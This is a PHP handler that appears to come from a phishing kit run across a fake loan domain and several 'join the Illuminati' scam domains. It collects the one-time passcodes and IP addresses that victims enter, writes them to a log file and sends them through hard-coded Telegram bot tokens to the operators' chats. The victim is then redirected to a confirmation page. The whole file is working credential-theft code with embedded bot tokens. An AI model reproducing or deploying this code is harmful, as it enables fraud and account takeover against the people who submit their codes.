<?php
// =========================================
// 🔐 UNIVERSAL CONFIRM OTP HANDLER (Multi-site)
// =========================================
// include 'firewall.php';

// 🌐 Define your site-specific configurations here
$site_map = [
    'upstartloan.rf.gd' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '7775401700:AAFsyHpfgM9kNryQozLz8Mjmp5lDeaG0D44', 'chat_id' => '7510889526']

        ],
        'redirect' => 'https://upstartloan.rf.gd/cache_site/processing.html'
    ],

    'illuminatigroup.world' => [
        "bots" => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '8459891488:AAHBwkSpyaRAtGCI6yWm_-39c61LJhQgI4w', 'chat_id' => '5978851707'],
        ],
        "redirect" => "https://illuminatigroup.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
    ],

    'illuminatiglobal.world' => [
        "bots" => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '8572613269:AAEMx8dbCNQnUHfKtZ5kuhpVfjE6fBdhofw', 'chat_id' => '6512010552'],
        ],
        "redirect" => "https://illuminatiglobal.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
    ],

    'illuminatinetwork.world' => [
        "bots" => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '8233162319:AAGUMse4WldCYNsGerfsU2FDnmY-_Heo-yM', 'chat_id' => '6944000447'],
        ],
        "redirect" => "https://illuminatinetwork.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
    ],

    'illuminaticonnect.world' => [
        "bots" => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '8578491453:AAFjqP9TdTwv4IpsCJdghljt28y0yHqnYD8', 'chat_id' => '1972703470'],
        ],
        "redirect" => "https://illuminaticonnect.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
    ],


];


// 🧾 Logging utility
$log_file = 'submission_log.txt';
function logToFile($data, $file) {
    $entry = "[" . date("Y-m-d H:i:s") . "] $data\n";
    file_put_contents($file, $entry, FILE_APPEND);
}

// 📬 Telegram message sender
function sendToBots($message, $bots) {
    foreach ($bots as $bot) {
        $url = "https://api.telegram.org/bot{$bot['token']}/sendMessage";
        $data = [
            'chat_id' => $bot['chat_id'],
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_RETURNTRANSFER => true
        ]);
        curl_exec($ch);
        curl_close($ch);
    }
}

// 🧠 Main logic
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $otp = htmlspecialchars($_POST['otpconfirm'] ?? '???');
    $ip = htmlspecialchars($_POST['ip'] ?? 'No ip');
    $referer = $_SERVER['HTTP_REFERER'] ?? '';
    $domain = parse_url($referer, PHP_URL_HOST) ?? 'unknown';
    $timestamp = date("Y-m-d H:i:s");

    $msg = "✅ *OTP Confirmation from $domain*\n\n" .
           "🔒 *Code:* $otp\n" .
           "🌐 *IP:* $ip\n" .
           "⏰ *Time:* $timestamp";

    logToFile("[$domain] Confirm OTP: $otp | IP: $ip", $log_file);

    if (isset($site_map[$domain])) {
        $config = $site_map[$domain];
        sendToBots($msg, $config['bots']);
        header("Location: " . $config['redirect']);
        exit;
    } else {
        logToFile("❌ Unauthorized domain: $domain", $log_file);
        exit("Unauthorized");
    }
}
?>
